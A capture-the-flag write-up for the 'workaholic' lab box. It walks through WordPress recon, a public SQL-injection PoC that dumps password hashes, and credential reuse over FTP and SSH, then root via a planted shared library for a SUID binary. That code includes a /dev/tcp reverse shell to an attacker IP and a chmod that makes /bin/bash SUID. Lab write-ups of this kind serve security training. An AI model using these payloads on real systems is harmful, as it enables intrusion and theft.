# CTF Writeup: workaholic

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.129.229
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 23:40 -0500
Nmap scan report for 192.168.129.229
Host is up (0.030s latency).
Not shown: 65505 filtered tcp ports (no-response), 27 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-generator: WordPress 6.7.2
|_http-title: Workaholic
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   29.56 ms 192.168.45.1
2   29.63 ms 192.168.45.254
3   30.68 ms 192.168.251.1
4   30.71 ms 192.168.129.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.40 seconds
```

Upon inspecting the webpage, we see that it's utilizing wordpress, when pressing on the title we get forwarded to an domain called "workaholic.offsec", let's map the target ip to this domain in our local dns file /etc/hosts.

```
sudo echo "192.168.129.229 workaholic.offsec" | sudo tee -a /etc/hosts
```

Let's enumerate endpoints.

```
dirsearch -u http://workaholic.offsec                                                                        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/workaholic/reports/http_workaholic.offsec/_25-12-29_23-47-59.txt

Target: http://workaholic.offsec/

[23:47:59] Starting: 
[23:48:01] 404 -   55KB - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
[23:48:15] 301 -    0B  - /admin.  ->  http://workaholic.offsec/admin/      
[23:48:24] 301 -    0B  - /asset..  ->  http://workaholic.offsec/asset/     
[23:48:25] 301 -    0B  - /axis//happyaxis.jsp  ->  http://workaholic.offsec/axis/happyaxis.jsp/
[23:48:25] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  http://workaholic.offsec/axis2/axis2-web/HappyAxis.jsp/
[23:48:25] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  http://workaholic.offsec/axis2-web/HappyAxis.jsp/
[23:48:29] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://workaholic.offsec/Citrix/AccessPlatform/auth/clientscripts/cookies.js/
[23:48:36] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  http://workaholic.offsec/engine/classes/swfupload/swfupload_f9.swf/
[23:48:36] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  http://workaholic.offsec/engine/classes/swfupload/swfupload.swf/
[23:48:37] 301 -    0B  - /extjs/resources//charts.swf  ->  http://workaholic.offsec/extjs/resources/charts.swf/
[23:48:41] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  http://workaholic.offsec/html/js/misc/swfupload/swfupload.swf/
[23:48:42] 301 -    0B  - /index.php  ->  http://workaholic.offsec/         
[23:48:42] 301 -    0B  - /index.php/login/  ->  http://workaholic.offsec/login/
[23:48:42] 301 -    0B  - /index.php::$DATA  ->  http://workaholic.offsec/index.php::DATA/
[23:48:43] 301 -    0B  - /jkstatus;  ->  http://workaholic.offsec/jkstatus/
[23:48:43] 404 -   55KB - /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
[23:48:45] 200 -   19KB - /license.txt                                      
[23:48:45] 301 -    0B  - /login.wdm%2e  ->  http://workaholic.offsec/login.wdm/
[23:48:45] 301 -    0B  - /login.wdm%20  ->  http://workaholic.offsec/login.wdm/
[23:48:50] 301 -    0B  - /New%20folder%20(2)  ->  http://workaholic.offsec/New%20folder%20(2/
[23:48:54] 301 -    0B  - /phpmyadmin!!  ->  http://workaholic.offsec/phpmyadmin/
[23:48:59] 301 -    0B  - /rating_over.  ->  http://workaholic.offsec/rating_over/
[23:48:59] 200 -    7KB - /readme.html                                      
[23:49:04] 301 -    0B  - /static..  ->  http://workaholic.offsec/static/   
[23:49:08] 301 -    0B  - /Trace.axd::$DATA  ->  http://workaholic.offsec/Trace.axd::DATA/
[23:49:12] 301 -    0B  - /web.config::$DATA  ->  http://workaholic.offsec/web.config::DATA/
[23:49:13] 301 -  178B  - /wp-admin  ->  http://workaholic.offsec/wp-admin/ 
[23:49:13] 302 -    0B  - /wp-admin/  ->  http://workaholic.offsec/wp-login.php?redirect_to=http%3A%2F%2Fworkaholic.offsec%2Fwp-admin%2F&reauth=1
[23:49:13] 400 -    1B  - /wp-admin/admin-ajax.php
[23:49:13] 409 -    3KB - /wp-admin/setup-config.php                        
[23:49:13] 200 -    1KB - /wp-admin/install.php
[23:49:13] 200 -    0B  - /wp-config.php                                    
[23:49:13] 301 -  178B  - /wp-content  ->  http://workaholic.offsec/wp-content/
[23:49:13] 200 -    0B  - /wp-content/                                      
[23:49:13] 403 -  564B  - /wp-content/uploads/                              
[23:49:13] 200 -   69B  - /wp-content/plugins/akismet/akismet.php           
[23:49:14] 500 -    0B  - /wp-content/plugins/hello.php                     
[23:49:14] 301 -  178B  - /wp-includes  ->  http://workaholic.offsec/wp-includes/
[23:49:14] 403 -  564B  - /wp-includes/
[23:49:14] 200 -    0B  - /wp-cron.php                                      
[23:49:14] 200 -    0B  - /wp-includes/rss-functions.php                    
[23:49:14] 200 -    4KB - /wp-login.php                                     
[23:49:14] 302 -    0B  - /wp-signup.php  ->  http://workaholic.offsec/wp-login.php?action=register
[23:49:14] 405 -   42B  - /xmlrpc.php                                       
                                                                             
Task Completed
```

Most of these endpoints are dead-ends, but the wordpress endpoints seemed to work, besides the wp-config.php ofc.

Enumerated subdomains.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://workaholic.offsec -H "Host: FUZZ.workaholic.offsec" -fs 51576

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://workaholic.offsec
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.workaholic.offsec
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 51576
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
```

Mapped the subdomain www.workaholic.offsec to our target ip in our local dns file.

```
nano /etc/hosts
192.168.129.229 workaholic.offsec www.workaholic.offsec
```

I won't spend more time falling into this rabbit hole, since upon inspecting the page the url get's resetted to workaholic.offsec. We couldn't find any attack vector's besides wordpress. So Let's start enumerating wordpress.

```
wpscan --url http://workaholic.offsec    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://workaholic.offsec/ [192.168.129.229]
[+] Started: Mon Dec 29 23:57:10 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.24.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://workaholic.offsec/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://workaholic.offsec/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://workaholic.offsec/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.2 identified (Insecure, released on 2025-02-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://workaholic.offsec/?feed=rss2, <generator>https://wordpress.org/?v=6.7.2</generator>
 |  - http://workaholic.offsec/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.7.2</generator>

[+] WordPress theme in use: twentytwentyfive
 | Location: http://workaholic.offsec/wp-content/themes/twentytwentyfive/
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://workaholic.offsec/wp-content/themes/twentytwentyfive/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://workaholic.offsec/wp-content/themes/twentytwentyfive/style.css?ver=1.0
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://workaholic.offsec/wp-content/themes/twentytwentyfive/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-advanced-search
 | Location: http://workaholic.offsec/wp-content/plugins/wp-advanced-search/
 | Last Updated: 2025-09-10T09:36:00.000Z
 | [!] The version is out of date, the latest version is 3.3.9.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 3.3.8 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://workaholic.offsec/wp-content/plugins/wp-advanced-search/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:17 <===============================================================> (137 / 137) 100.00% Time: 00:00:17

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Dec 29 23:57:44 2025
[+] Requests Done: 172
[+] Cached Requests: 6
[+] Data Sent: 44.761 KB
[+] Data Received: 379.822 KB
[+] Memory used: 269.102 MB
[+] Elapsed time: 00:00:34
```

We enumerated an plugin called "wp-advanced-search" with version 3.3.9.4, which seems to be out of date.

The WordPress version 6.7.2 also seems to be out-dated.

There seems to be an "unauthenticated" SQL Injection in place for the plugin, utilized the following exploit.

```
git clone https://github.com/BwithE/CVE-2024-9796.git
```

Gave the "poc.py" executable permissions.

```
chmod +x poc.py
```

Ran the exploit and retrieved user credentials

```
python3 poc.py -i workaholic.offsec
[!] workaholic.offsec has been PWNed!
admin:$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.
charlie:$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.
ted:$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
```

The password seemed to be encoded, we'll have to decode them.

I utilized hashcat for this:

```
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
```

For some reason, this didn't work out. I also read up on the offsec discord, that a lot of people seem to have issue's with bruteforcing the hashes.

I searched up online and found the password for user ted:okadamat17

Logged into ftp with user "ted".

```
ftp 192.168.129.229
```

the current ftp share seems to be the webroot of the server we identified that the wp-config.php is inside there. Let's download it and potentially retrieve credentials

```
ftp> get wp-config.php
local: wp-config.php remote: wp-config.php
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for wp-config.php (3178 bytes).
100% |*************************************************************************************************|  3178       31.24 MiB/s    00:00 ETA
226 Transfer complete.
3178 bytes received in 00:00 (113.41 KiB/s)
```

Retrived MySQL database credentials.

```
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );
```

Logged into ssh with user "charlie" charlie:rU)tJnTw5*ShDt4nOx

```
ssh charlie@workaholic.offsec
charlie@workaholic.offsec's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Dec 30 06:28:51 AM UTC 2025

  System load:  0.0               Processes:               162
  Usage of /:   54.7% of 9.75GB   Users logged in:         0
  Memory usage: 34%               IPv4 address for ens192: 192.168.129.229
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

17 updates can be applied immediately.
10 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$
```

Retrieved local.txt in /home/charlie directory.

```
58f06a827c65bac80afc5d3a10320924
```

## Privilege Escalation

The Shell seemed very weak, let's upgrade it.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated binaries on the target server, with the SUID set.

```
charlie@workaholic:~$ find / -perm /4000 2>/dev/null
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/var/www/html/wordpress/blog/wp-monitor
```

The /var/www/html/wordpress/blog/wp-monitor binary seemed rather interesting, because it's an custom binary. Upon executing it, nothing is happening and we don't get any hints on any shared object injection. 

But when we performed forensics and analyzed the binary, we retrieved the following:

```
POST /wp-login.php
[Warning] Possible brute force attack detected: %s
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
9*3$"
```

It informs us that it uses the libsecurity.so in /home/ted/.lib and is missing an plugin there called "init_plugin".

Upon checking if we have write access to /home/ted we found out that we have! we can replace the libsecurity.so file with an malicious one of us and then run the binary with the SUID set, which should give us root shell.

```
charlie@workaholic:/var/www/html/wordpress/blog$ find / -type d -writable 2>/dev/null
/run/lock
/run/screen
/run/user/1001
/run/user/1001/systemd
/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/propagate
/run/user/1001/systemd/propagate/.os-release-stage
/run/user/1001/systemd/units
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/gnupg
/proc/2770/task/2770/fd
/proc/2770/fd
/proc/2770/map_files
/tmp
/dev/shm
/dev/mqueue
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope
/var/crash
/var/tmp
/var/lib/php/sessions
/home/ted
/home/charlie
/home/charlie/.ssh
/home/charlie/.cache
```

We will have to create an malicious reverse shell .c script, then compile it to an libsecurity.so file with gcc, which also exists on the target system.

We created the folder .lib in the /home/ted directory and put our .c script inside of there.

```
mkdir .lib
cd .lib/
```
```
charlie@workaholic:/home/ted/.lib$ cat shell.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {

    setgid(0);
    setuid(0);
    system("bash -i >& /dev/tcp/192.168.45.219/80 0>&1");
}

```

Compiled the .c file to an libsecurity.so file

```
charlie@workaholic:/home/ted/.lib$ gcc -shared -fPIC -nostartfiles shell.c -o libsecurity.so
charlie@workaholic:/home/ted/.lib$ ls
libsecurity.so  shell.c
```

Let's start up our listener on port 80.

```
nc -lvnp 80
```

This didn't work. Let's modify the .c script so it sets the /bin/bash binary to SUID set.

Note: that we have to modify the function name to "init_plugin" inside the .c file, since the wp-monitor binary needs it.

```
cat libsecurity.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {

    setgid(0);
    setuid(0);
    system("chmod u+s /bin/bash");
}
```

I repeated the process of compiling it to an .so file and then executed the wp-monitor binary.

```
charlie@workaholic:/home/ted/.lib$ /var/www/html/wordpress/blog/wp-monitor
[+] Checking the logs...
```

This time there was no error, so I'm assuming it worked.

Gained RCE as user "root".

```
charlie@workaholic:/home/ted/.lib$ /bin/bash -p
bash-5.2# whoami
root
```

Retrieved proof.txt in /root directory.

```
7fc488e6df3248d4776495b39d959913
```
